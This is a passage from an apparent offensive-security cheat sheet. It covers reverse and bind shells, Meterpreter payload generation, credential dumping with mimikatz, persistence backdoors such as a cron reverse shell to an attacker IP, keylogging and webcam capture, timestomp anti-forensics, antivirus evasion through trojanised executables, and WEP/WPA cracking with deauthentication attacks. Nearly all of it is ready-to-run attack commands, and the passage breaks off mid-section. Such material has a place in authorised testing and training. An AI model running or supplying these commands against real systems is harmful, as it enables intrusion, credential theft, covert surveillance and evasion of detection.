# Step 2: Background the shell (Ctrl+Z)

# Step 3: Configure terminal
stty raw -echo; fg
# Press Enter twice

# Step 4: Reset terminal
reset

# Step 5: Set terminal type and size
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 38 columns 116  # Adjust to your terminal size
```

**Check Terminal Size (Attacker Machine)**

bash

```bash
stty size  # Returns: rows columns
```

### Encrypted Reverse Shells

**OpenSSL Reverse Shell**

bash

```bash
# Listener (attacker)
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port <port>

# Target connection
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <attacker_ip>:<port> > /tmp/s; rm /tmp/s
```

**Socat Encrypted Reverse Shell**

bash

```bash
# Listener (attacker)
socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 STDOUT

# Target connection
socat OPENSSL:<attacker_ip>:<port>,verify=0 EXEC:/bin/bash
```

## Bind Shell Techniques

### Concept Difference from Reverse Shells

[Inference: Based on networking principles]

**Bind Shell**: Target system listens on a port; attacker connects to target.

- Used when reverse connections are blocked
- Requires target firewall to allow incoming connections
- Target IP must be reachable by attacker

**Reverse Shell**: Attacker listens on a port; target connects to attacker.

- Bypasses inbound firewall rules
- Works through NAT
- More commonly used in CTF scenarios

### Linux Bind Shells

**Netcat Bind Shells**

bash

```bash
# Target (listener)
nc -lvnp <port> -e /bin/bash
nc -lvp <port> -e /bin/bash

# Without -e flag (mkfifo method)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp <port> > /tmp/f

# Attacker (connect)
nc <target_ip> <port>
```

**Python Bind Shell**

python

```python
# Target (listener)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",<port>));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Attacker (connect)
nc <target_ip> <port>
```

**Perl Bind Shell**

bash

```bash
# Target (listener)
perl -e 'use Socket;$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'

# Attacker (connect)
nc <target_ip> <port>
```

**PHP Bind Shell**

bash

```bash
# Target (listener)
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",<port>);socket_listen($s,1);$cl=socket_accept($s);$d=socket_read($cl,1024);while(1){$c=socket_read($cl,1024);$o=shell_exec($c);socket_write($cl,$o);}'

# Attacker (connect)
nc <target_ip> <port>
```

### Windows Bind Shells

**Netcat Bind Shell (Windows)**

cmd

```cmd
# Target (listener)
nc.exe -lvnp <port> -e cmd.exe

# Attacker (connect)
nc <target_ip> <port>
```

**PowerShell Bind Shell**

powershell

```powershell
# Target (listener)
powershell -nop -c "$listener = New-Object System.Net.Sockets.TcpListener('<target_ip>',<port>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"

# Attacker (connect)
nc <target_ip> <port>
```

**Metasploit Bind Shell Payload**

bash

```bash
# Generate payload
msfvenom -p windows/shell_bind_tcp LPORT=<port> -f exe -o bind.exe

# Set up handler
msfconsole -q
use exploit/multi/handler
set payload windows/shell_bind_tcp
set RHOST <target_ip>
set LPORT <port>
exploit
```

### Socat Bind Shells

**Basic Socat Bind Shell**

bash

```bash
# Target (listener) - Linux
socat TCP-LISTEN:<port> EXEC:/bin/bash

# Target (listener) - Windows
socat TCP-LISTEN:<port> EXEC:'cmd.exe',pipes

# Attacker (connect)
socat - TCP:<target_ip>:<port>
```

**Encrypted Socat Bind Shell**

bash

```bash
# Generate certificate (target)
openssl req -newkey rsa:2048 -nodes -keyout bind.key -x509 -days 365 -out bind.crt cat bind.key bind.crt > bind.pem

# Target (listener)
socat OPENSSL-LISTEN:<port>,cert=bind.pem,verify=0 EXEC:/bin/bash

# Attacker (connect)
socat - OPENSSL:<target_ip>:<port>,verify=0

````

**Socat File Transfer via Bind Shell** [Inference: Useful for exfiltration]
```bash
# Target (send file)
socat TCP-LISTEN:<port>,reuseaddr FILE:/etc/passwd

# Attacker (receive file)
socat TCP:<target_ip>:<port> STDOUT

# Target (receive file)
socat TCP-LISTEN:<port>,reuseaddr OPEN:/tmp/received_file,creat

# Attacker (send file)
socat FILE:payload.exe TCP:<target_ip>:<port>
````

## Meterpreter Sessions

### Meterpreter Payload Generation

**Windows Meterpreter Payloads**

bash

```bash
# Staged reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe -o shell.exe

# Stageless reverse TCP
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe -o shell.exe

# Reverse HTTPS (encrypted)
msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=<port> -f exe -o shell.exe

# Bind TCP
msfvenom -p windows/meterpreter/bind_tcp LPORT=<port> -f exe -o bind.exe

# With encoding (evasion)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# DLL format
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f dll -o shell.dll

# PowerShell script
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f psh -o shell.ps1

# ASP/ASPX format
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f asp -o shell.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f aspx -o shell.aspx
```

**Linux Meterpreter Payloads**

bash

```bash
# Staged reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f elf -o shell.elf

# Stageless reverse TCP
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f elf -o shell.elf

# 64-bit version
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f elf -o shell.elf

# Bind TCP
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=<port> -f elf -o bind.elf
```

**Web Application Payloads**

bash

```bash
# PHP Meterpreter
msfvenom -p php/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f raw -o shell.php

# JSP Meterpreter
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f raw -o shell.jsp

# WAR file (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f war -o shell.war
```

**Platform-Specific Payloads**

bash

```bash
# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f raw -o shell.py

# Java
msfvenom -p java/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f jar -o shell.jar

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -o malicious.apk
```

### Setting Up Multi-Handler

**Basic Multi-Handler Configuration**

bash

```bash
msfconsole -q

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
set ExitOnSession false  # Keep handler active for multiple sessions
exploit -j  # Run as background job

# Alternative: run in foreground
exploit
```

**Multi-Handler for Specific Payloads**

bash

```bash
# For HTTPS reverse shell
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST <attacker_ip>
set LPORT 443
set LURI /random_uri  # Custom URI path
exploit -j

# For bind shell
use exploit/multi/handler
set payload windows/meterpreter/bind_tcp
set RHOST <target_ip>
set LPORT <port>
exploit

# For stageless payload
use exploit/multi/handler
set payload windows/meterpreter_reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit -j
```

**Resource Script for Quick Setup** [Inference: Automates handler configuration]

bash

```bash
# Create handler.rc
cat > handler.rc << EOF
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
set ExitOnSession false
exploit -j
EOF

# Execute resource script
msfconsole -q -r handler.rc
```

### Core Meterpreter Commands

**Session Management**

bash

```bash
# From msfconsole
sessions -l                    # List active sessions
sessions -i <id>               # Interact with session
sessions -k <id>               # Kill session
sessions -K                    # Kill all sessions
sessions -u <id>               # Upgrade shell to meterpreter

# From Meterpreter session
background                     # Background current session (Ctrl+Z)
exit                          # Exit session
detach                        # Detach from session
```

**System Information Gathering**

bash

```bash
sysinfo                       # System information
getuid                        # Current user
getpid                        # Current process ID
ps                            # List running processes
ipconfig / ifconfig           # Network configuration
route                         # Routing table
arp                           # ARP cache
netstat                       # Network connections
```

**File System Operations**

bash

```bash
pwd                           # Current directory
ls                            # List files
cd <directory>                # Change directory
cat <file>                    # Display file contents
download <remote> <local>     # Download file from target
upload <local> <remote>       # Upload file to target
search -f <filename>          # Search for files
edit <file>                   # Edit file
rm <file>                     # Delete file
mkdir <directory>             # Create directory
rmdir <directory>             # Remove directory
```

**File System Navigation Examples**

bash

```bash
# Windows
cd C:\\Users
cd "C:\\Program Files"
download C:\\Users\\victim\\Desktop\\flag.txt /tmp/flag.txt

# Linux
cd /home
download /etc/passwd /tmp/passwd
upload exploit.sh /tmp/exploit.sh
```

**Process Management**

bash

```bash
ps                            # List processes
getpid                        # Current process ID
migrate <pid>                 # Migrate to another process
kill <pid>                    # Kill process
execute -f <program> -a <args> -i -H  # Execute program
                              # -i: Interactive, -H: Hidden
```

**Process Migration Best Practices** [Inference: For stability and evasion]

bash

```bash
# List processes and identify targets
ps

# Common migration targets (Windows)
# - explorer.exe (user-level, persistent)
# - svchost.exe (system-level, multiple instances)
# - lsass.exe (system-level, credential access)

# Migrate to explorer.exe
ps | grep explorer
migrate <explorer_pid>

# Auto-migrate to stable process
run post/windows/manage/migrate
```

### Privilege Escalation via Meterpreter

**Windows Privilege Escalation**

bash

```bash
# Check current privileges
getuid
getprivs

# Attempt UAC bypass
use exploit/windows/local/bypassuac
set SESSION <session_id>
exploit

# Token impersonation
use incognito
list_tokens -u                # List available tokens
impersonate_token "NT AUTHORITY\\SYSTEM"

# Automated privilege escalation
run post/multi/recon/local_exploit_suggester
getsystem                     # Attempt automatic SYSTEM elevation
```

**Linux Privilege Escalation**

bash

```bash
# Check sudo permissions
shell
sudo -l
exit

# Upload and run privilege escalation tools
upload /usr/share/unix-privesc-check/unix-privesc-check /tmp/
shell
chmod +x /tmp/unix-privesc-check
/tmp/unix-privesc-check standard
```

### Credential Harvesting

**Windows Credential Dumping**

bash

```bash
# Load kiwi (mimikatz) module
load kiwi

# Dump credentials
creds_all                     # Dump all credentials
creds_msv                     # MSV credentials
creds_wdigest                 # WDigest credentials
creds_kerberos               # Kerberos credentials
creds_ssp                    # SSP credentials
creds_tspkg                  # TsPkg credentials

# Specific mimikatz commands
kiwi_cmd sekurlsa::logonpasswords
kiwi_cmd lsadump::sam
kiwi_cmd lsadump::secrets

# Dump SAM database
run post/windows/gather/hashdump
hashdump                     # Built-in command

# Dump cached domain credentials
run post/windows/gather/cachedump
```

**Credential Location Enumeration**

bash

```bash
# Search for credential files
search -f *.kdbx              # KeePass databases
search -f *password*
search -f credential*
search -f *.ppk               # PuTTY private keys

# Browser credential extraction
run post/multi/gather/firefox_creds
run post/windows/gather/enum_chrome

# WiFi password extraction
run post/windows/gather/enum_wifi
```

### Persistence Mechanisms

**Windows Persistence**

bash

```bash
# Registry run key
run persistence -X -i 60 -p <port> -r <attacker_ip>
# -X: Startup, -i: interval, -p: port, -r: host

# Service persistence
run metsvc
# Creates metsvc service

# Scheduled task
run scheduleme -m 60 -p <attacker_ip> -o <port>

# Manual persistence via registry
reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v backdoor -d "C:\\backdoor.exe"

# WMI event subscription [Inference: Fileless persistence]
run persistence_wmi -p <attacker_ip> -o <port>
```

**Linux Persistence**

bash

```bash
# Cron job
shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'" | crontab -
exit

# SSH key installation
shell
mkdir -p ~/.ssh
echo "<attacker_public_key>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
exit
```

### Pivoting and Port Forwarding

**Port Forwarding**

bash

```bash
# Local port forward (access target's local service)
portfwd add -l <local_port> -p <target_port> -r <target_ip>

# Example: Forward target's RDP
portfwd add -l 3389 -p 3389 -r 127.0.0.1
# Connect via: rdesktop 127.0.0.1

# Reverse port forward (expose attacker service to target)
portfwd add -R -l <target_port> -p <attacker_port> -L <attacker_ip>

# List active forwards
portfwd list

# Delete forward
portfwd delete -l <local_port>
portfwd flush                 # Delete all forwards
```

**Route Addition for Pivoting**

bash

```bash
# Add route to internal network
run autoroute -s <subnet>/<netmask>
# Example: run autoroute -s 10.10.10.0/24

# List routes
run autoroute -p

# Manual route addition
route add <subnet> <netmask> <session_id>
route print
```

**SOCKS Proxy Setup**

bash

```bash
# From msfconsole (not Meterpreter session)
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j

# Configure proxychains
nano /etc/proxychains4.conf
# Add: socks4 127.0.0.1 1080

# Use through proxychains
proxychains nmap -sT -Pn <internal_target>
proxychains ssh user@<internal_target>
```

### Advanced Meterpreter Modules

**Screenshot and Keylogging**

bash

```bash
# Take screenshot
screenshot

# Start keylogger
keyscan_start
keyscan_dump                  # Dump captured keystrokes
keyscan_stop

# Continuous screenshot capture
run post/windows/manage/screenshare
```

**Webcam and Microphone Access** [Inference: Requires appropriate hardware]

bash

```bash
# Webcam operations
webcam_list                   # List available webcams
webcam_snap                   # Take snapshot
webcam_stream                 # Stream video

# Audio recording
record_mic -d 30              # Record 30 seconds
```

**Network Sniffing**

bash

```bash
# Load sniffer module
load sniffer

# List network interfaces
sniffer_interfaces

# Start packet capture
sniffer_start <interface_id>

# Dump captured packets
sniffer_dump <interface_id> /tmp/capture.pcap

# Stop capture
sniffer_stop <interface_id>

# Analyze with Wireshark
# On attacker machine: wireshark /tmp/capture.pcap
```

**Timestomp (Anti-Forensics)**

bash

```bash
# View file timestamps
timestomp <file> -v

# Modify timestamps to match another file
timestomp <target_file> -f <reference_file>

# Set specific timestamps
timestomp <file> -m "01/01/2020 12:00:00"  # Modified time
timestomp <file> -a "01/01/2020 12:00:00"  # Accessed time
timestomp <file> -c "01/01/2020 12:00:00"  # Created time

# Blank timestamps (zeros)
timestomp <file> -b
```

### Meterpreter Post-Exploitation Modules

**Information Gathering Modules**

bash

```bash
# System enumeration
run post/windows/gather/enum_system
run post/linux/gather/enum_system

# Network enumeration
run post/windows/gather/enum_network
run post/multi/gather/ping_sweep RHOSTS=<subnet>

# Application enumeration
run post/windows/gather/enum_applications
run post/windows/gather/enum_av_excluded  # AV exclusions
run post/windows/gather/enum_patches      # Installed patches

# Domain enumeration
run post/windows/gather/enum_domain
run post/windows/gather/enum_domain_users
run post/windows/gather/enum_domain_group_users GROUP="Domain Admins"
```

**Automated Exploitation Modules**

bash

```bash
# Local exploit suggester
run post/multi/recon/local_exploit_suggester

# UAC bypass attempts
run post/windows/escalate/uac_bypass

# Token hunter
run post/windows/gather/enum_tokens
```

**Data Exfiltration Modules**

bash

```bash
# File collection
run post/windows/gather/forensics/enum_drives
run post/windows/gather/dumplinks        # Recent files

# Clipboard capture
run post/windows/gather/clipboard

# Registry enumeration
run post/windows/gather/enum_unattend    # Unattend.xml passwords
run post/windows/gather/credentials/windows_autologin

# VPN credential extraction
run post/windows/gather/credentials/pulse_secure
```

### Shell Upgrades and Conversions

**Upgrade Regular Shell to Meterpreter**

bash

```bash
# From msfconsole with active non-meterpreter session
sessions -l
sessions -u <session_id>      # Auto-upgrade

# Manual method
use post/multi/manage/shell_to_meterpreter
set SESSION <session_id>
set LHOST <attacker_ip>
set LPORT <new_port>
exploit
```

**Access System Shell from Meterpreter**

bash

```bash
# Drop to system shell
shell

# Execute single command
execute -f cmd.exe -i -H -c
execute -f /bin/bash -i -c

# Return to Meterpreter
exit
```

### Meterpreter Session Handling

**Background and Foreground Sessions**

bash

```bash
# Background current session
background
# Or: Ctrl+Z

# From msfconsole
sessions -l                   # List sessions
sessions -i <id>              # Interact with session
sessions -i <id> -c "sysinfo" # Run command in session
```

**Session Passing Between Handlers** [Inference: Useful for changing protocols]

bash

```bash
# Generate new payload
msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=443 -f exe -o shell_https.exe

# Set up new handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST <attacker_ip>
set LPORT 443
exploit -j

# From existing session, upload and execute new payload
upload shell_https.exe C:\\Windows\\Temp\\
execute -f C:\\Windows\\Temp\\shell_https.exe -H
```

### Meterpreter Scripting and Automation

**Resource Scripts for Automation**

bash

```bash
# Create post-exploitation resource script
cat > post_exploit.rc << EOF
sysinfo
getuid
screenshot
hashdump
run post/windows/gather/enum_applications
download C:\\Users\\victim\\Desktop\\* /tmp/loot/
EOF

# Execute in active session
sessions -i <id> -r post_exploit.rc

# Or from within Meterpreter
resource post_exploit.rc
```

**Common Automation Patterns**

bash

```bash
# Quick credential dump script
cat > quick_dump.rc << EOF
load kiwi
creds_all
hashdump
download C:\\Windows\\System32\\config\\SAM /tmp/
download C:\\Windows\\System32\\config\\SYSTEM /tmp/
EOF

# Network pivot setup script
cat > pivot_setup.rc << EOF
run autoroute -s 10.10.10.0/24
portfwd add -l 3389 -p 3389 -r 10.10.10.50
background
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
EOF
```

### Troubleshooting Meterpreter Sessions

**Connection Issues**

[Inference: Common troubleshooting steps]

bash

```bash
# Verify handler is running
jobs -l

# Check firewall rules (attacker)
iptables -L -n -v | grep <port>

# Test connectivity
# From target: nc -zv <attacker_ip> <port>

# Regenerate payload with correct LHOST/LPORT
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<correct_ip> LPORT=<port> -f exe -o new_shell.exe
```

**Session Stability Issues**

bash

```bash
# Migrate to stable process immediately
ps | grep explorer
migrate <pid>

# Use stageless payload for unstable networks
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe -o stageless.exe

# Increase timeouts
set SessionCommunicationTimeout 600
set EnableStageEncoding true
```

**AV Evasion for Meterpreter** [Unverified: Effectiveness varies by AV]

bash

```bash
# Encoding (limited effectiveness)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe -o encoded.exe

# Custom template
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -x /path/to/legitimate.exe -k -f exe -o trojan.exe

# Encryption
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> --encrypt aes256 --encrypt-key mysecretkey -f exe -o encrypted.exe

# Use HTTPS instead of HTTP
msfvenom -p windows/meterpreter/reverse_https LHOST=<attacker_ip> LPORT=443 -f exe -o https_shell.exe
```

### Important Related Tools

**Metasploit Auxiliary Modules for Initial Access**

bash

```bash
# SMB credential validation
use auxiliary/scanner/smb/smb_login
set RHOSTS <target>
set SMBUser <username>
set SMBPass <password>
run

# SSH brute force with valid creds
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USERNAME <username>
set PASSWORD <password>
run
```

**Related Topics for Further Study**

- Post-Exploitation Frameworks (Empire, Covenant, Cobalt Strike alternatives)
- C2 Infrastructure Setup and OpSec
- Lateral Movement Techniques (Pass-the-Hash, Pass-the-Ticket)
- Active Directory Enumeration and Exploitation
- Advanced Persistence Mechanisms (Rootkits, Bootkits)
- Memory-Only Malware and Fileless Techniques

---

# Wireless Network Access

## WEP Cracking

WEP (Wired Equivalent Privacy) cracking exploits fundamental cryptographic weaknesses in the WEP protocol, enabling rapid key recovery and network access through IV reuse, weak key scheduling, and predictable keystream patterns.

**Wireless Network Discovery and Reconnaissance**

Identify WEP-secured networks requiring target selection and signal analysis:

```bash
# Passive network scanning
iw dev wlan0 set type monitor
ip link set wlan0 up

airodump-ng wlan0
airodump-ng --band a wlan0
airodump-ng --channel 1-13 wlan0

# Targeted network monitoring
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0
```

Output analysis identifies:

- BSSID: Access Point MAC address
- SSID: Network name
- CH: Channel number (1-14 for 2.4GHz, varies by region)
- ENC: Encryption type (WEP displays as "WEP")
- CIPHER: Encryption algorithm (WEP uses RC4)
- PWR: Signal strength (negative dBm, closer to 0 = stronger)
- Beacons: Management frames count
- IV: Initialization Vector count

[Inference] WEP networks display encryption type "WEP" in airodump output, enabling rapid identification for targeted attacks before beginning capture or crack procedures.

**Initialization Vector (IV) Collection**

Capture IVs for keystream analysis and recovery:

```bash
# Capture traffic to file
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0

# Monitor capture progress
# Output displays IV count incrementing during capture
# Typically require 100,000-1,000,000+ IVs for successful key recovery

# Alternative using tcpdump
tcpdump -i wlan0 -w capture.pcap "wlan type mgt and (wlan.fc.subtype == 0x08 or wlan.fc.subtype == 0x04)"

# Analyze captured data
wireshark capture.pcap
```

[Inference] IV collection rate depends on network activityâ€”active networks transmitting numerous packets enable faster IV accumulation, while passive networks may require extended capture periods or traffic injection to accelerate collection.

**Traffic Generation for IV Acceleration**

Inject or replay traffic to increase IV generation rate:

```bash
# Associate with network (if network permits)
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
# -1: Fake authentication
# -0: Wait indefinitely for beacon
# -a: Access point BSSID
# -h: Source MAC

# ARP request replay (generates many IVs)
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
# -3: ARP request replay
# Listens for ARP packets and replays them
# Each ARP packet generates multiple IVs

# Accelerated mode (aggressive IV generation)
aireplay-ng -3 -x 128 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
# -x 128: Transmit 128 bytes per second
```

[Unverified] ARP replay attacks assume ARP traffic exists on the networkâ€”completely isolated networks may not generate sufficient ARP packets for acceleration, though most connected networks transmit periodic ARP requests enabling this technique.

**WEP Key Recovery**

Crack the WEP key using collected IVs:

```bash
# Using aircrack-ng
aircrack-ng capture-01.cap
# Performs statistical analysis on collected IVs
# Output displays recovered key in hexadecimal and ASCII

# Specify network BSSID
aircrack-ng -b AA:BB:CC:DD:EE:FF capture-01.cap

# Specify key length
aircrack-ng -l 64 capture-01.cap  # 64-bit WEP
aircrack-ng -l 128 capture-01.cap # 128-bit WEP
aircrack-ng -l 256 capture-01.cap # 256-bit WEP

# Output format
# [00:00:00] Tested 1234567 keys, 0.24 keys/sec
# KEY FOUND! [ AA:BB:CC:DD:EE ]
```

[Inference] WEP key recovery success depends on sufficient IV collectionâ€”typically 100,000-300,000 IVs enable reliable key recovery using statistical attacks exploiting FMS (Fluhrer, Mantin, and Shamir) vulnerability in WEP key scheduling.

**WEP Key Application and Access**

Use recovered keys to access the network:

```bash
# Manual configuration
# Add network profile with recovered key

# Using airolib-ng database integration
airolib-ng wepdb --import essid networks.txt
airolib-ng wepdb --import passwd wordlist.txt
aircrack-ng -r wepdb capture-01.cap

# Connect to network with key
nmcli device wifi connect "SSID" password "AA:BB:CC:DD:EE" --ask
# Alternative with wpa_supplicant
wpa_supplicant -i wlan0 -c wpa_supplicant.conf -D nl80211

# Verify connectivity
iwconfig wlan0
ip addr show
```

Configuration file for WEP connection (wpa_supplicant.conf):

```
network={
    ssid="TargetWEP"
    key_mgmt=NONE
    wep_key0="HEXKEY"
    wep_tx_keyidx=0
}
```

[Inference] Successfully recovered WEP keys function identically to legitimate credentials, enabling full network access as if the attacker possessed the original key.

**WEP with Weak Key Analysis**

Exploit WEP weak key scheduling vulnerability:

```bash
# Statistical analysis identifies weak IVs
# Weak IVs correlate with specific key bytes
# FMS attack exploits this correlation

# Direct weak IV targeting
aircrack-ng -f 2 capture-01.cap  # Use only weak IVs
# -f 2: KoreK implementation (faster, newer weak IV detection)

# Output shows accelerated recovery with fewer IVs required
# Weak IVs: 5000
# Keys tested: 50000
# Time: <1 minute
```

[Inference] Weak IV targeting reduces IV requirements from 100,000+ to 5,000-10,000 by focusing analysis on IVs statistically correlated with specific key bytes, dramatically accelerating key recovery.

**WEP Cracking with Dictionary Attack Integration**

Combine WEP cracking with password dictionaries:

```bash
# Create dictionary from potential keys
echo -e "password123\nwelcome\nadmin" > wep_wordlist.txt

# Hex convert and test against capture
aircrack-ng -w wep_wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# Rainbow table integration
# Pre-compute WEP key hashes for common passwords
airolib-ng wepdb --import essid networks.txt
airolib-ng wepdb --import passwd wep_wordlist.txt
aircrack-ng -r wepdb capture-01.cap
```

[Unverified] Dictionary-based WEP cracking enables rapid recovery when administrators use dictionary words or common patterns as WEP keys, though [Inference] random keys remain vulnerable to statistical attacks regardless of randomness.

**WEP Client Authentication Analysis**

Exploit weak client authentication:

```bash
# Capture client authentication frames
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w auth_capture wlan0

# Monitor for client association
# Authentication happens before association

# Deauthentication attack (force re-authentication)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 00:11:22:33:44:55 wlan0
# -0: Deauthentication
# 10: Number of deauth packets
# -a: Access point BSSID
# -c: Client MAC to deauthenticate

# Client re-authenticates, generating new authentication frames
# Analysis of authentication reveals WEP key information
```

[Inference] Client authentication attacks force credential resubmission in observable plaintext-like formats, enabling [Inference] key recovery from authentication exchanges rather than standard encrypted traffic.

**WEP Cracking Troubleshooting**

Address common WEP cracking issues:

```bash
# Insufficient IV collection
# Monitor IV rate and increase if necessary
# aircrack-ng requires minimum 100,000 IVs for reliable recovery
# Some implementations require 300,000+

# No traffic on network
# Use aireplay-ng to generate traffic
# ARP replay requires existing ARP packets to work

# Authentication fails before replay
# Use fake authentication to associate
aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0

# Verify monitor mode active
iwconfig wlan0
# Output should show "Mode:Monitor"

# Check capture file integrity
aircrack-ng capture-01.cap --list-aeskeys  # Verify readable
```

[Inference] WEP cracking failures typically result from insufficient IV collection or network association issues rather than cryptographic implementation, requiring procedural adjustments rather than technical bypass.

**WEP Network Authentication Bypass**

Bypass open authentication for networks requiring it:

```bash
# Some WEP networks use authentication despite encryption
# Open authentication phase before WEP encryption

aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0
# -1 0: Fake open authentication (0 means no authentication type)

# Shared key authentication (requires WEP key first)
# Not applicable during initial key recovery

# Proceed with traffic capture and cracking
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0
```

[Inference] Open authentication on WEP networks enables association without prior key knowledge, allowing IV collection and statistical key recovery without password submission.

---

## WPA/WPA2 Cracking

WPA/WPA2 cracking exploits weak pre-shared keys (PSK) through dictionary attacks against handshake hashes or exploits protocol vulnerabilities enabling keystream recovery and packet decryption.

**WPA/WPA2 Network Reconnaissance**

Identify WPA/WPA2-secured networks for targeted attacks:

```bash
# Monitor for WPA networks
airodump-ng wlan0
# ENC column displays "WPA2" or "WPA2/WPA"
# CIPHER column shows "CCMP" (AES) or "TKIP"

# Target specific network
airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0
```

Network security indicators:

- **CIPHER: CCMP** â€” AES encryption (modern, stronger)
- **CIPHER: TKIP** â€” TKIP encryption (legacy, weaker)
- **AUTH: PSK** â€” Pre-shared key (password-based)
- **AUTH: MGT** â€” Management frame protection

[Inference] TKIP/WPA networks are technically weaker than CCMP/WPA2, though both remain vulnerable to weak password cracking through handshake dictionary attacks.

**Four-Way Handshake Capture**

Capture WPA four-way handshake for offline cracking:

```bash
# Capture continuously waiting for handshake
airodump-ng -c 11 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0

# Handshake detected when client connects
# Output shows "[WPA Handshake: AA:BB:CC:DD:EE:FF]" when successful

# Accelerate handshake capture through deauthentication
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0
# -0: Deauthentication
# 5: Number of deauth packets
# Clients re-authenticate, handshake captured

# Targeted deauthentication of specific client
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 00:11:22:33:44:55 wlan0
# -c: Target client MAC
```

[Inference] Deauthentication attacks force client re-connection to the network, generating handshakes observable by adjacent attackers during capture window.

**WPA Handshake Processing**

Extract handshake for offline analysis:

```bash
# Verify handshake in capture file
aircrack-ng wpa_capture-01.cap
# Output shows:
# "No targets found in file!"  (no handshake)
# or
# "1 handshake found"  (successful capture)

# Extract handshake to separate file
aircrack-ng -J wpa_handshake wpa_capture-01.cap
